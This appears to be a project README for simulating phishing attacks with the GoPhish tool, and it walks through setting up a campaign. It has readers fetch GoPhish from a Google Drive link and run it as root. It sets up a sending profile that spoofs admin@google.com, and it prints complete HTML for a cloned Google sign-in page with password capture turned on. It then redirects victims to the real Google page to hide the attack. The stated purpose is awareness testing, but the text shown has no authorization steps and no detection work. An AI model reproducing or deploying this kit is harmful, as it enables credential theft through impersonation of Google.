# Phishing-Attack-Simulation-and-Detection
## 📌Objective
Simulate phishing attacks to test awareness and implement detection mechanisms (e.g., email filters, fake website detection).
## 🔧Tools
Phishing simulation tools, email security tools, Python.

# Setup Of Simulation Attack
## GoPhish Tool
<div align="center">
  <img src="assets/gophish-image.png" alt="SUCCESS Solve The Room Demo" width="800">
  <p align="center">
    <b>Figure: Phishing Campaign Tool</b>
  </p>
</div>

Download the Tool From this link 
```
https://drive.google.com/file/d/1-kyDqVMtSWZw7mJ_6coaBP7ENRy4xwbs/view?usp=sharing
```
Extract the Downloaded zip file
```
unzip gophish.zip
```
After Downloaded And You Will See a file [ gophish ] Now make this Executable Use Command
```
chmod +x gophish
```
Run GoPhish
```
sudo ./gophish
```
After that you will see in the Terminal Default 'USERNAME' and 'PASSWORD' to Login the tool, You will instructed after login.

# Setup Campaign in GoPhish
## Step 1. Sending Profile (The SMTP Configuration)
<b>Profile Name: Google Admin</b>

<b>SMTP From: admin@google.com</b>

<b>Host: smtp.gmail.com:587</b>

<b>Username/Password: Your Gmail address and an App Password (not your login password).</b>

<b>Click on Save Profile</b>

## Step 2. Landing Page (The Google Clone)
<b>Name: Login Account</b>

<b>Copy This HTML Login Page Code And Past HTML Editor</b>
```
<!DOCTYPE html><html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { border: 1px solid #dadce0; border-radius: 8px; width: 450px; padding: 48px 40px 36px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 24px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; margin-top: 20px; width: 100%; }
        .footer-text { color: #1a73e8; font-size: 14px; margin-top: 40px; text-align: left; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-card">
        <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"/>
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Email or phone" required=""/>
            <input type="password" name="password" placeholder="Enter your password" required=""/>
            <div style="text-align: left; color: #5f6368; font-size: 14px; margin-top: 5px;">Not your computer? Use Guest mode to sign in privately.</div>
            <button type="submit" class="btn">Next</button>
        </form>
        
        <div class="footer-text">Create account</div>
    </div>

</body></html>
```

<b>Capture Submitted Data: Checked (ON).</b>

<b>Capture Passwords: Checked (ON).</b>

<b>Redirect to: https://accounts.google.com (to hide the attack after the victim "logs in").</b>
